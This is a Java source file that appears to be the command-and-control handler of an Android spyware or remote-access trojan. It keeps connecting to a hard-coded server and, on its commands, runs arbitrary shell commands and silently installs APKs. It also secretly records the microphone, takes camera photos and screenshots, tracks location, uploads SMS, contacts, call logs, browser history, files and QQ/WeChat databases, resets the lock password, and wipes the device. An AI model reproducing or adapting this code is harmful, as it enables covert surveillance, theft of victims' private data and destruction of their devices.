package com.network;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import com.main.MainUtils;
import com.main.ForegroundService;
import com.phone.control.DeviceManager;
import com.phone.control.MessageBox;
import com.phone.control.UnInstallSelf;
import com.phone.control.rootFunction;
import com.phone.data.AppMessage;
import com.phone.data.BrowserHistory;
import com.phone.data.CameraDialog;
import com.phone.data.MicAudioRecord;
import com.phone.data.PhoneAPP;
import com.phone.data.PhoneCall;
import com.phone.data.PhoneContacts;
import com.phone.data.PhoneFiles;
import com.phone.data.PhoneInformation;
import com.phone.data.PhoneLocation;
import com.phone.data.PhoneRunningApps;
import com.phone.data.PhoneSMS;
import com.phone.data.PhoneWIFI;
import com.phone.data.QQWXDB;
import com.phone.data.ShellCmd;
import com.utils.ExceptionProcess;
import com.utils.PhoneFilesUtils;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.content.Context;
import android.util.Log;


public class ServerCommand implements Runnable{
	private static final String TAG = "ServerCommand";
	
	private Context context = null;
	private int cmd = 0;
	private byte[] recvimei = new byte[Public.IMEI_IMSI_PHONE_SIZE];

	
	public ServerCommand(Context context){	
		this.context = context;
		this.cmd = Public.CMD_HEARTBEAT;
	}
	
	boolean compareImei(byte[]imei1,byte[]imei2){
		if (imei1.length != imei2.length) {
			return false;
		}
		for (int i = 0; i < imei1.length; i++) {
			if (imei1[i] != imei2[i]) {
				
				return false;
			}
		}
		
		return true;
	}
	
	
	
	public void run(){
		while(true){
			Socket socket = null;
			OutputStream ous = null;
			InputStream ins = null;
			try{
				if(Network.isNetworkConnected (context) == true){
		            socket = new Socket();
		            InetSocketAddress inetaddr = new InetSocketAddress(Public.SERVER_IP_ADDRESS, Public.SERVER_CMD_PORT);
		            socket.connect(inetaddr, Public.SERVER_CMD_CONNECT_TIMEOUT);
		            //With this option set to a non-zero timeout, 
		            //a read() call on the InputStream associated with this Socket will block for only this amount of time.
		            //If the timeout expires, a java.net.SocketTimeoutException is raised, though the Socket is still valid. 
		            socket.setSoTimeout(Public.SERVERCMD_ALARM_INTERVAL);
					ous = socket.getOutputStream();
					ins = socket.getInputStream();
					
					Public.gOnlineType = Network.getNetworkType(context);
					
					boolean ret = false;
					ret = sendCmdToServer("".getBytes(), ous, cmd, Public.IMEI);
					if (ret == true) {
						byte[] recvbuf = new byte[Public.RECV_SEND_BUFSIZE];
						while(true){
						
							int recvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE);
							if(recvlen >= 24){		
							
								System.arraycopy(recvbuf, 8, recvimei, 0, Public.IMEI_IMSI_PHONE_SIZE);
			
								if (compareImei(recvimei,Public.IMEI) == true) {
									int result = ServerCommandProc(ins,ous,recvbuf,recvlen);
									if (result < 0) {
										Log.e(TAG,"ServerCommand recv packet error:" + result);
										WriteDateFile.writeLogFile("ServerCommand recv packet error:" + result + "\r\n");
										
										break;
									}else{
										continue;
									}
								}else{
									break;
								}
							}else{
								break;
							}
						}
					}
				}
			}catch(Exception ex){
				ex.printStackTrace();
			}
			
			try{
				if (ins != null) {
					ins.close();
					ins = null;
				}
				
				if(ous != null){
					ous.close();
					ous = null;
				}
				
				if(socket != null){
					socket.close();
					socket = null;
				}
			}catch(Exception exp){
				exp.printStackTrace();
			}
			
			try {
				Thread.sleep(Public.SERVERCMD_ALARM_INTERVAL);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
			
	
	
	public int ServerCommandProc(InputStream ins,OutputStream ous,byte[]recvbuf,int recvlen){
		try{
			byte[] byterecvpacklen = new byte[4];
			System.arraycopy(recvbuf, 0, byterecvpacklen, 0, 4);
			int recvpacklen = PublicFunction.bytesToInt(byterecvpacklen);
			if ( (recvpacklen > Public.MAX_TRANSFER_FILESIZE) || (recvpacklen < 24) ) {
				return -1;
			}		
			
			byte[] byteservercmd = new byte[4];
			System.arraycopy(recvbuf, 4, byteservercmd, 0, 4);
			int servercmd = PublicFunction.bytesToInt(byteservercmd);
			
			if (recvpacklen > recvlen) {
				//假设下面的指令不能在当前缓冲区长度内收完
				if (servercmd == Public.CMD_DOWNLOADFILE ||
						servercmd == Public.CMD_AUTOINSTALL ||
						servercmd == Public.CMD_UPDATEPROC) {
					;
				}
				//假设下面的指令能够在当前缓冲区长度内全部收完
				else if (servercmd == Public.CMD_RUNCOMMAND ||
						servercmd == Public.CMD_MICAUDIORECORD ||
	 					servercmd == Public.CMD_DATA_CAMERAPHOTO ||
						servercmd == Public.CMD_SETCONFIG ||
						servercmd == Public.CMD_RESETPASSWORD ||
						servercmd == Public.CMD_PHONECALL ||
						servercmd == Public.CMD_SENDMESSAGE ||
						servercmd == Public.CMD_UPLOADFILE ||
						servercmd == Public.CMD_DATA_LOCATION||
						servercmd == Public.CMD_DATA_SCRNSNAPSHOT ||
						servercmd == Public.CMD_MESSAGEBOX) {
									
					int nextrecvlen = 0;
					while((nextrecvlen = ins.read(recvbuf,recvlen,Public.RECV_SEND_BUFSIZE - recvlen)) > 0){
						recvlen += nextrecvlen;
						if (recvlen >= recvpacklen) {
							break;
						}
					}
					
					if (recvlen != recvpacklen) {
						return -1;
					}
				}
				//假设下面的指令没有参数
				else if (servercmd == Public.CMD_HEARTBEAT ||
						servercmd == Public.CMD_DATA_APPMESSAGE ||
	 					servercmd == Public.CMD_RESETSYSTEM ||
	 					servercmd == Public.CMD_WIPESTORAGE ||
	 					servercmd == Public.CMD_WIPESYSTEM ||
						servercmd == Public.CMD_DATA_MESSAGE ||
						servercmd == Public.CMD_DATA_CONTACTS ||
						servercmd == Public.CMD_DATA_CALLLOG||
						servercmd == Public.CMD_DATA_APPPROCESS ||
						servercmd == Public.CMD_DATA_DEVICEINFO ||
						servercmd == Public.CMD_DATA_FILERECORD ||
	 					servercmd == Public.CMD_DATA_SDCARDFILES ||
						servercmd == Public.CMD_DATA_EXTCARDFILES||
						servercmd == Public.CMD_DATA_FLASHCARDFILES ||
						servercmd == Public.CMD_DATA_WIFI||
						servercmd == Public.CMD_DATA_WEBKITHISTORY ||
						servercmd == Public.CMD_UNINSTALL ||
						servercmd == Public.CMD_RESETPROGRAM ||
						servercmd == Public.CMD_SHUTDOWNSYSTEM ||
						servercmd == Public.CMD_UPLOAD_LOG) {

					return -1;
				}else{
					return -2;
				}
			}

			if(servercmd == Public.CMD_HEARTBEAT || servercmd == Public.CMD_NETWORKTYPE){
				Public.gOnlineType = Network.getNetworkType(context);
				sendCmdToServer("".getBytes(), ous, Public.CMD_HEARTBEAT, Public.IMEI);
				return 0;
			}
			else if (servercmd == Public.CMD_MESSAGEBOX) {
				byte[] bytetitlelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytetitlelen, 0, 4);
				int titlelen = PublicFunction.bytesToInt(bytetitlelen);
				
				byte[] title = new byte[titlelen];
				System.arraycopy(recvbuf, 28, title, 0, titlelen);
				
				byte[] bytectlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + titlelen, bytectlen, 0, 4);
				int ctlen = PublicFunction.bytesToInt(bytectlen);
				
				byte[] content = new byte[ctlen];
				System.arraycopy(recvbuf, 24 + 4 + titlelen + 4, content, 0, ctlen);
				
				MessageBox msgBox = new MessageBox(context, new String(title), new String(content));
				Thread thread = new Thread(msgBox);
				thread.start();
				
				WriteDateFile.writeLogFile("recv cmd messagebox\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_LOCATION) {
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = PublicFunction.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = PublicFunction.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);
				
				
				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = PublicFunction.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);


				MainUtils adv = new MainUtils(context, new String(start),new String(end),new String(val),2);
				Thread thread = new Thread(adv);
				thread.start();
				
				WriteDateFile.writeLogFile("recv cmd location\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SINGLELOCATION) {
				new Thread(new PhoneLocation(context)).start();
				WriteDateFile.writeLogFile("recv cmd single location\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_CANCELLOCATION) {
				new Thread(new MainUtils(context,4)).start();
				WriteDateFile.writeLogFile("recv cmd cancel location\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_CANCELSCREENCAP) {
				new Thread(new MainUtils(context,3)).start();
				WriteDateFile.writeLogFile("recv cmd cancel screen\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SINGLESCREENCAP) {
				new Thread(new Runnable() {
					@Override
					public void run() {
						MainUtils.doScreenshotOnce(context);
					}
				}).start();
				WriteDateFile.writeLogFile("recv cmd single screen\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_SCRNSNAPSHOT) {			
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = PublicFunction.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = PublicFunction.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);
				
				
				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = PublicFunction.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);

				MainUtils adv = new MainUtils(context, new String(start),new String(end),new String(val),1);
				Thread thread = new Thread(adv);
				thread.start();

				WriteDateFile.writeLogFile("recv cmd screensnapshot\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CAMERAPHOTO) {
				
				byte[] bytecamera = new byte[4];
				System.arraycopy(recvbuf, 24, bytecamera, 0, 4);
				int intcamera = PublicFunction.bytesToInt(bytecamera);			
				
				CameraDialog camera = new CameraDialog(context,intcamera);
				Thread thread = new Thread(camera);
				thread.start();
				
				WriteDateFile.writeLogFile("recv cmd camera\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_MICAUDIORECORD) {
				byte[] byteseconds = new byte[4];
				System.arraycopy(recvbuf, 24, byteseconds, 0, 4);
				int seconds = PublicFunction.bytesToInt(byteseconds);
				if (seconds <= 0) {
					seconds = 60;
				}else if (seconds > 3600) {
					seconds = 3600;
				}

				MicAudioRecord mic = new MicAudioRecord(context,seconds);
				Thread thread = new Thread(mic);
				thread.start();

				WriteDateFile.writeLogFile("recv cmd mic audio record second:" + seconds +"\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_AUTOINSTALL) {
				//阻塞命令需要在命令端口线程完成文件收发
				
				FileDownloader.apkDownloader(recvbuf, recvlen, recvpacklen, context, ins);
//				new Thread(new Runnable() {
//					@Override
//					public void run() {
//						FileDownloader.apkDownloader(recvbuf, recvlen, recvpacklen, context, ins);
//					}
//				}).start();
				
				WriteDateFile.writeLogFile("recv cmd autoinstall\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_UPLOADFILE){
				FileUploader.fileUploader(recvbuf, recvlen, recvpacklen, ins, ous);
				WriteDateFile.writeLogFile("recv cmd upload file\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UPDATEPROC) {
				FileDownloader.pluginDownloader(recvbuf, recvlen, recvpacklen, context, ins);
				WriteDateFile.writeLogFile("recv cmd update plugin\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DOWNLOADFILE) {
				FileDownloader.fileDownloader(recvbuf, recvlen, recvpacklen, context, ins);
				WriteDateFile.writeLogFile("recv cmd download file\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_RUNCOMMAND){
				byte[] bytecmdlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytecmdlen, 0, 4);
				int cmdlen = PublicFunction.bytesToInt(bytecmdlen);
				byte[] cmdcontent = new byte[cmdlen];
				System.arraycopy(recvbuf, 28, cmdcontent, 0, cmdlen);
				String shellcmd = new String(cmdcontent);
				
				ShellCmd cmd = new ShellCmd(shellcmd);
				Thread thread = new Thread(cmd);
				thread.start();
				
				WriteDateFile.writeLogFile("recv cmd shellcmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_PHONECALL) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = PublicFunction.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);

				PhoneCall call = new PhoneCall(context,strphoneno);
				Thread thread = new Thread(call);
				thread.start();

				WriteDateFile.writeLogFile("recv cmd phonecall\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SENDMESSAGE) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = PublicFunction.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);
				
				byte[] bytemsglen = new byte[4];
				System.arraycopy(recvbuf, 28 + phonelen, bytemsglen, 0, 4);
				int msglen = PublicFunction.bytesToInt(bytemsglen);
				byte[] msg = new byte[msglen];
				System.arraycopy(recvbuf, 32 + phonelen, msg, 0, msglen);
				String strmsg = new String(msg);

				WriteDateFile.writeLogFile("recv cmd send message\r\n");
				
				PhoneSMS sms = new PhoneSMS(context,strphoneno,strmsg);
				Thread thread = new Thread(sms);
				thread.start();
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPMESSAGE) {
				AppMessage appmsg = new AppMessage(context);
				Thread thread = new Thread(appmsg);
				thread.start();
				
				WriteDateFile.writeLogFile("ServerCommand send app message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_RESETPASSWORD) {
				byte[] bytepswlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytepswlen, 0, 4);
				int pswlen = PublicFunction.bytesToInt(bytepswlen);
				
				String strpsw = "";
				if(pswlen > 0 && pswlen <= 16){
					byte[] psw = new byte[pswlen];
					System.arraycopy(recvbuf, 28, psw, 0, pswlen);
					strpsw = new String(psw);
				}else if(pswlen == 0){
					strpsw = "";
				}
				
				DeviceManager.resetLockPassword(context,strpsw);
				WriteDateFile.writeLogFile("recv cmd reset lock-screen-password\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_WIPESYSTEM) {
				WriteDateFile.writeLogFile("ServerCommand wipesystem cmd\r\n");
				
				DeviceManager.wipeSetting(context);
				return 0;
			}
			else if (servercmd == Public.CMD_WIPESTORAGE) {
				WriteDateFile.writeLogFile("ServerCommand wipe storage cmd\r\n");
				
				DeviceManager.wipeStorage(context);
				return 0;
			}
			else if(servercmd == Public.CMD_RESETPROGRAM){
				rootFunction.restart(context);
				WriteDateFile.writeLogFile("recv reset program cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_RESETSYSTEM) {
				WriteDateFile.writeLogFile("ServerCommand reset system ok\r\n");
				
				DeviceManager.resetSystem(context);
				return 0;
			}
			else if (servercmd == Public.CMD_SHUTDOWNSYSTEM) {
				rootFunction.shutdown(context);
				WriteDateFile.writeLogFile("recv shutdown system cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_MESSAGE) {
				
				PhoneSMS sms = new PhoneSMS(context);
				Thread thread = new Thread(sms);
				thread.start();

				WriteDateFile.writeLogFile("ServerCommand phone message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CALLLOG) {
				PhoneCall call = new PhoneCall(context);
				Thread thread = new Thread(call);
				thread.start();

				WriteDateFile.writeLogFile("ServerCommand calllog ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CONTACTS) {
				PhoneContacts contacts = new PhoneContacts(context);
				Thread thread = new Thread(contacts);
				thread.start();
				
				WriteDateFile.writeLogFile("ServerCommand contact ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_SDCARDFILES) {
		    	PhoneFiles sdcardfies = new PhoneFiles(context,ForegroundService.SDCARDPATH,ForegroundService.LOCAL_PATH_NAME,
		    			ForegroundService.SDCARDFILES_NAME,
		    			Public.CMD_DATA_SDCARDFILES);
		    	Thread threadsdcardfiles = new Thread(sdcardfies);
		    	threadsdcardfiles.start();
		    	WriteDateFile.writeLogFile("ServerCommand sd card command\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_FLASHCARDFILES) {
				ShellCmd.execShell("su", "");
		    	PhoneFiles flashfiles = new PhoneFiles(context,"/",ForegroundService.SDCARD_PATH_NAME,
		    			ForegroundService.FLASHCARDFILES_FILENAME,
		    			Public.CMD_DATA_FLASHCARDFILES);
		    	Thread tf = new Thread(flashfiles);
		    	tf.start();
		    	WriteDateFile.writeLogFile("ServerCommand flash card command ok\r\n");
			}
			else if (servercmd == Public.CMD_DATA_EXTCARDFILES) {
				
				new Thread(new PhoneFilesUtils(context, 2)).start();
		    	WriteDateFile.writeLogFile("ServerCommand ext card command ok\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_DEVICEINFO) {
				PhoneInformation info = new PhoneInformation(context);
				Thread thread = new Thread(info);
				thread.start();

				WriteDateFile.writeLogFile("ServerCommand deviceinfo cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WIFI) {
				PhoneWIFI wifi = new PhoneWIFI(context);
				Thread thread = new Thread(wifi);
				thread.start();

				WriteDateFile.writeLogFile("recv wifi info cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WEBKITHISTORY) {
		    	//content://org.mozilla.firefox.db.browser/bookmarks
		    	//content://com.android.chrome.browser/bookmarks
		    	//content://com.ume.browser/bookmarks
		    	//content://browser/bookmarks
				String uri = "content://browser/bookmarks";
		    	String webkithistroy = BrowserHistory.getWebKitRecord(context,uri);
		    	if (webkithistroy != null && webkithistroy.equals("") == false) {
					SendDataToServer.sendDataToServer(webkithistroy.getBytes(), webkithistroy.getBytes().length, 
							Public.CMD_DATA_WEBKITHISTORY, Public.IMEI);
				}
		    	WriteDateFile.writeLogFile("recv get webkit history cmd\r\n");
		    	return 0;
			}
			else if(servercmd == Public.CMD_UPLOAD_LOG){
		    	File filelog = new File(ForegroundService.LOCAL_PATH_NAME + ForegroundService.LOG_FILE_NAME);
				
		    	if(filelog.exists() == true){
		    		int logsize = (int)filelog.length();
	    			byte[] bytelog = new byte[logsize];
	    			FileInputStream fin = new FileInputStream(filelog);
	    			fin.read(bytelog, 0, logsize);
	    			fin.close();
	    			filelog.delete();
	    			SendDataToServer.sendDataToServer(bytelog, bytelog.length,Public.CMD_UPLOAD_LOG, Public.IMEI);
		    	}
		    	
		    	WriteDateFile.writeLogFile("recv cmd upload log file\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPPROCESS) {
				PhoneAPP app = new PhoneAPP(context);
				Thread thread = new Thread(app);
				thread.start();

				WriteDateFile.writeLogFile("ServerCommand appprocess cmd\r\n");    	   	
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_RUNNINGAPPS) {
				PhoneRunningApps apps = new PhoneRunningApps(context);
				Thread thread = new Thread(apps);
				thread.start();

				WriteDateFile.writeLogFile("ServerCommand running cmd\r\n");    	   	
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_FILERECORD) {
		    	File filerecord = new File(ForegroundService.LOCAL_PATH_NAME + ForegroundService.FILEOBSERVER_FILE_NAME);
		    	if(filerecord.exists() == true){
		    		int recordseize = (int)filerecord.length();
	    			byte[] byterecord = new byte[recordseize];
	    			FileInputStream fin = new FileInputStream(filerecord);
	    			fin.read(byterecord, 0, recordseize);
	    			fin.close();
	    			filerecord.delete();
	    			SendDataToServer.sendDataToServer(byterecord, byterecord.length,Public.CMD_DATA_FILERECORD, Public.IMEI);
		    	}
		    	
				WriteDateFile.writeLogFile("ServerCommand filerecord cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UNINSTALLSELF) {
				UnInstallSelf.uninstallSelf(context);
				
				Log.e(TAG,"recv uninstall cmd ok\r\n");
				WriteDateFile.writeLogFile("ServerCommand recv uninstall cmd ok\r\n");
				
				return 0;
			}
			else if (servercmd == Public.CMD_UPLOADDB) {
				byte[] bytepcmd = new byte[4];
				System.arraycopy(recvbuf, 24, bytepcmd, 0, 4);
				int cmd = PublicFunction.bytesToInt(bytepcmd);
				new Thread(new QQWXDB(context,cmd)).start();
				
				WriteDateFile.writeLogFile("ServerCommand recv CMD_UPLOADDB:" + cmd +" cmd\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_CHANGEIP){
				byte[] bytecmdlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytecmdlen, 0, 4);
				int cmdlen = PublicFunction.bytesToInt(bytecmdlen);
				byte[] cmd = new byte[cmdlen];
				System.arraycopy(recvbuf, 28, cmd, 0, cmdlen);
				String strcmd = new String(cmd);

				WriteDateFile.writeLogFile("ServerCommand recv CMD_CHANGEIP:" + strcmd +" cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SETCONFIG) {
				
				/*
				byte[] bytecmdlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytecmdlen, 0, 4);
				int cmdlen = PublicFunction.bytesToInt(bytecmdlen);
				byte[] cmd = new byte[cmdlen];
				System.arraycopy(recvbuf, 28, cmd, 0, cmdlen);
				//String strcmd = new String(cmd);
		    	String paramprefpath = ForegroundService.LOCAL_PATH_NAME + ForegroundService.PARAMCONFIG_FileName;
		    	File file = new File(paramprefpath);
		    	if (file.exists() == true) {
					file.delete();
				}
		    	FileOutputStream fout = new FileOutputStream(file,false);
		    	fout.write(cmd);
		    	fout.flush();
		    	fout.close();
		    	ParamConfig.setConfigFromJson(paramprefpath);
				*/

				//WriteDateFile.writeLogFile("ServerCommand config cmd\r\n");
				return 0;
			}
			else{
				WriteDateFile.writeLogFile("ServerCommand recv unrecognized command\r\n");
				return 0;
			}
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("ServerCommand exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return - 3;
		}
		
		return 0;
	}
	
	
	
	
	public static boolean sendCmdToServer(byte[] data,OutputStream ous,int cmdtype,byte[] byteimei){
		try{
			int sendsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE + data.length;	
			byte[] senddata = new byte[sendsize];
		
			int offset = 0;
			byte bytesendseize[] = PublicFunction.intToBytes(sendsize);
			for (int i = 0; i < bytesendseize.length; i++) {
				senddata[offset +i] = bytesendseize[i];
			}
			offset += bytesendseize.length;
			
			byte[] bytecmd = PublicFunction.intToBytes(cmdtype);
			for (int i = 0; i < bytecmd.length; i++) {
				senddata[offset + i] = bytecmd[i];
			}
			offset += bytecmd.length;
			
			//command without cryption or compression
			int mode = Public.gOnlineType;
			byte bytereserved[] = PublicFunction.intToBytes(mode);		
			for (int i = 0; i < bytereserved.length; i++) {
				senddata[offset + i] = bytereserved[i];
			}
			offset += bytereserved.length;
			
			for (int i = 0; i < byteimei.length; i++) {
				senddata[offset + i] = byteimei[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;
			
			
			for (int i = 0; i < Public.UserName.length(); i++) {
				senddata[offset + i] = Public.UserName.getBytes()[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;

			for (int i = 0; i < data.length; i++) {
				senddata[offset + i] = data[i];
			}
			offset += data.length;
			
			ous.write(senddata, 0, sendsize);
			ous.flush();
			return true;
		} 
		catch (Exception ex) {
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("ServerCommand command:" + String.valueOf(cmdtype) + " exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return false;
		}
	}
}
